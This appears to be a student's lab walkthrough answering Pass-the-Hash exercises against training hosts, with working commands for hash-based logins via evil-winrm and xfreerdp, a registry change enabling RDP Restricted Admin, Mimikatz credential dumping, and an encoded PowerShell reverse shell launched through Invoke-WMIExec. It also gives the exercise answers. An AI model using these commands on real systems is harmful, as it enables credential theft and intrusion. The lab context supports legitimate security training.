# [[Pass the Hash (PtH)]]

1. Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.
`nmap 10.129.204.23 -oN initial_enum -sV`
![[Pasted image 20260510224506.png]]

```shell
evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```cmd
type C:\\pth.txt
```

2. Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

`DisableRestrictedAdmin`

3. Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David’s account?

```shell
xfreerdp3 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /v:10.129.204.23
```
![[Pasted image 20260510224623.png]]
```shell
evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
![[Pasted image 20260510224715.png]]

```mimikatz
privilege::debug  
sekurlsa::logonpasswords
```
![[Pasted image 20260510224730.png]]

4. Using David’s hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.
```cmd
systeminfo | findstr /B /C:"Domain"
```
![[Pasted image 20260510224748.png]]
```mimikatz
sekurlsa::pth /user:david /rc4:==c39f2beb3d2ec06a62cb887fb391dee0== /domain:inlanefreight.htb /run:cmd.exe
```
![[Pasted image 20260510224803.png]]
```cmd
dir \\DC01\david  
type \\DC01\david\david.txt
```
![[Pasted image 20260510224825.png]]

5. Using Julio’s hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.
```mimikatz
privilege::debug  
sekurlsa::logonpasswords
```
![[Pasted image 20260510224841.png]]
```mimikatz
sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe
```

```cmd
dir \\DC01\julio  
type \\DC01\julio\julio.txt
```

6. Using Julio’s hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.
```cmd
cd c:\tools\Invoke-TheHash  
dir
```
![[Pasted image 20260510224955.png]]
```cmd
powershell  
Import-Module .\\Invoke-TheHash.psd1
```

```cmd
ping DC01  
ipconfig
```

Open a **second window** on MS01 and start netcat to catch the incoming connection from DC01:
```shell
xfreerdp3 /u:julio /pth:64f12cddaa88057e06a81b54e73b949b /v:10.129.204.23
```
![[Pasted image 20260510225047.png]]
```cmd
.\nc.exe -lvnp 8080
```
![[Pasted image 20260510225109.png]]
We can generate our reverse shell code with [https://www.revshells.com/](https://www.revshells.com/)
![[Pasted image 20260510225117.png]]
```powershell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADgAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQ"
```
![[Pasted image 20260510225148.png]]
